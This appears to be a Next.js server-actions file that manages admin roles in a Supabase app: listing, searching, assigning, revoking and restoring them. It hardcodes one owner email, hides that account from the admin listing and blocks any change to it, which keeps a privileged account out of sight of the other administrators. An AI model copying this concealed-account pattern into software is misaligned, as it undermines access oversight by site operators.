"use server";

import { requireAdminRole } from "@/lib/security/auth";
import { createAdminClient } from "@/lib/supabase/admin";
import { revalidatePath } from "next/cache";

export type AdminRoleEntry = {
  userId: string;
  email: string;
  fullName: string | null;
  role: string;
  active: boolean;
  mfaRequired: boolean;
  createdAt: string;
};

export type RoleActionState = {
  status: "idle" | "success" | "error";
  message: string;
};

const VALID_ROLES = ["owner", "admin", "manager", "hire_desk", "content"] as const;
type ValidRole = (typeof VALID_ROLES)[number];

function isValidRole(role: string): role is ValidRole {
  return (VALID_ROLES as readonly string[]).includes(role);
}

/** List all admin role holders with their profile and auth email */
export async function getAdminRoles(): Promise<AdminRoleEntry[]> {
  await requireAdminRole(["owner", "admin"]);
  const supabase = createAdminClient();

  const { data, error } = await supabase
    .from("admin_roles")
    .select("user_id, role, active, mfa_required, created_at, profiles(full_name, email)")
    .order("created_at", { ascending: false });

  if (error) throw new Error(`Failed to fetch admin roles: ${error.message}`);

  const HIDDEN_OWNER_EMAIL = "pankaj@techtonika-autolink.com";

  return (data ?? [])
    .filter((row) => {
      const profile = row.profiles as unknown as { email: string | null; full_name: string | null } | null;
      return profile?.email !== HIDDEN_OWNER_EMAIL;
    })
    .map((row) => {
    const profile = row.profiles as unknown as { email: string | null; full_name: string | null } | null;
    return {
      userId: row.user_id,
      email: profile?.email ?? "—",
      fullName: profile?.full_name ?? null,
      role: row.role,
      active: row.active,
      mfaRequired: row.mfa_required,
      createdAt: row.created_at,
    };
  });
}

/** Search for a user by email so admin can assign a role */
export async function searchUserByEmail(
  email: string,
): Promise<{ id: string; email: string; fullName: string | null } | null> {
  await requireAdminRole(["owner", "admin"]);

  const supabase = createAdminClient();

  // Search via profiles table (which has email column)
  const { data: profileData } = await supabase
    .from("profiles")
    .select("id, email, full_name")
    .ilike("email", email.trim())
    .maybeSingle();

  if (profileData) {
    return {
      id: profileData.id,
      email: profileData.email ?? email,
      fullName: profileData.full_name,
    };
  }

  // Fallback: search auth.users via admin API
  const { data: listData } = await supabase.auth.admin.listUsers({ page: 1, perPage: 1000 });
  const match = (listData?.users ?? []).find(
    (u) => u.email?.toLowerCase() === email.trim().toLowerCase(),
  );

  if (match) {
    // Before returning, ensure they exist in the profiles table to prevent foreign key errors
    // when assigning admin_roles.
    const { deriveProfileFromUser } = await import("@/lib/auth/profile");
    await supabase.from("profiles").upsert(deriveProfileFromUser(match), { onConflict: "id" });
    
    return {
      id: match.id,
      email: match.email!,
      fullName: match.user_metadata?.full_name ?? null,
    };
  }

  return null;
}

/** Assign or update an admin role for a user */
export async function assignAdminRole(
  _prev: RoleActionState,
  formData: FormData,
): Promise<RoleActionState> {
  const currentUser = await requireAdminRole(["owner", "admin"]);

  // If the user is an admin, they cannot assign an 'owner' role
  const { getUserAdminRole } = await import("@/lib/security/auth");
  const currentUserRole = await getUserAdminRole(currentUser);

  const email = String(formData.get("email") ?? "").trim().toLowerCase();
  const role = String(formData.get("role") ?? "");
  const mfaRequired = formData.get("mfaRequired") === "true";

  if (currentUserRole === "admin" && role === "owner") {
    return { status: "error", message: "Admins cannot assign the owner role." };
  }

  if (email === "pankaj@techtonika-autolink.com") {
    return { status: "error", message: "Cannot modify the system owner account." };
  }

  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return { status: "error", message: "Please enter a valid email address." };
  }

  if (!isValidRole(role)) {
    return { status: "error", message: `Invalid role "${role}". Allowed: ${VALID_ROLES.join(", ")}.` };
  }

  const supabase = createAdminClient();

  // Look up the user
  let user = await searchUserByEmail(email);
  if (!user) {
    // Auto-create the user if they don't exist
    const { data: newAuthUser, error: createError } = await supabase.auth.admin.createUser({
      email: email,
      email_confirm: true,
      user_metadata: { full_name: email.split("@")[0] },
    });

    if (createError || !newAuthUser.user) {
      return { 
        status: "error", 
        message: `Failed to auto-create user account: ${createError?.message || "Unknown error"}` 
      };
    }

    const { deriveProfileFromUser } = await import("@/lib/auth/profile");
    await supabase.from("profiles").upsert(deriveProfileFromUser(newAuthUser.user), { onConflict: "id" });

    user = {
      id: newAuthUser.user.id,
      email: newAuthUser.user.email!,
      fullName: newAuthUser.user.user_metadata?.full_name ?? null,
    };
  }

  // Upsert admin role
  const { error } = await supabase.from("admin_roles").upsert(
    {
      user_id: user.id,
      role,
      active: true,
      mfa_required: mfaRequired,
    },
    { onConflict: "user_id" },
  );

  if (error) {
    return { status: "error", message: `Failed to assign role: ${error.message}` };
  }

  // Audit log
  await supabase.from("activity_logs").insert({
    user_id: currentUser.id,
    action: "admin_role_assigned",
    entity_type: "admin_role",
    entity_id: user.id,
    diff: { email, role, mfaRequired },
  });

  revalidatePath("/admin/roles");

  return {
    status: "success",
    message: `Role "${role}" assigned to ${user.email}${user.fullName ? ` (${user.fullName})` : ""} successfully.`,
  };
}

/** Revoke (deactivate) an admin role */
export async function revokeAdminRole(userId: string): Promise<RoleActionState> {
  const currentUser = await requireAdminRole(["owner", "admin"]);
  const supabase = createAdminClient();

  const { getUserAdminRole } = await import("@/lib/security/auth");
  const currentUserRole = await getUserAdminRole(currentUser);

  // Check the role of the user being revoked
  const { data: targetRole } = await supabase
    .from("admin_roles")
    .select("role")
    .eq("user_id", userId)
    .single();
    
  if (currentUserRole === "admin" && targetRole?.role === "owner") {
    return { status: "error", message: "Admins cannot revoke owner roles." };
  }

  const { error } = await supabase
    .from("admin_roles")
    .update({ active: false })
    .eq("user_id", userId);

  if (error) {
    return { status: "error", message: `Failed to revoke role: ${error.message}` };
  }

  await supabase.from("activity_logs").insert({
    user_id: currentUser.id,
    action: "admin_role_revoked",
    entity_type: "admin_role",
    entity_id: userId,
  });

  revalidatePath("/admin/roles");
  return { status: "success", message: "Admin access revoked." };
}

/** Restore (reactivate) a previously revoked admin role */
export async function restoreAdminRole(userId: string): Promise<RoleActionState> {
  const currentUser = await requireAdminRole(["owner", "admin"]);
  const supabase = createAdminClient();

  const { getUserAdminRole } = await import("@/lib/security/auth");
  const currentUserRole = await getUserAdminRole(currentUser);

  // Check the role of the user being restored
  const { data: targetRole } = await supabase
    .from("admin_roles")
    .select("role")
    .eq("user_id", userId)
    .single();
    
  if (currentUserRole === "admin" && targetRole?.role === "owner") {
    return { status: "error", message: "Admins cannot restore owner roles." };
  }

  const { error } = await supabase
    .from("admin_roles")
    .update({ active: true })
    .eq("user_id", userId);

  if (error) {
    return { status: "error", message: `Failed to restore role: ${error.message}` };
  }

  await supabase.from("activity_logs").insert({
    user_id: currentUser.id,
    action: "admin_role_restored",
    entity_type: "admin_role",
    entity_id: userId,
  });

  revalidatePath("/admin/roles");
  return { status: "success", message: "Admin access restored." };
}
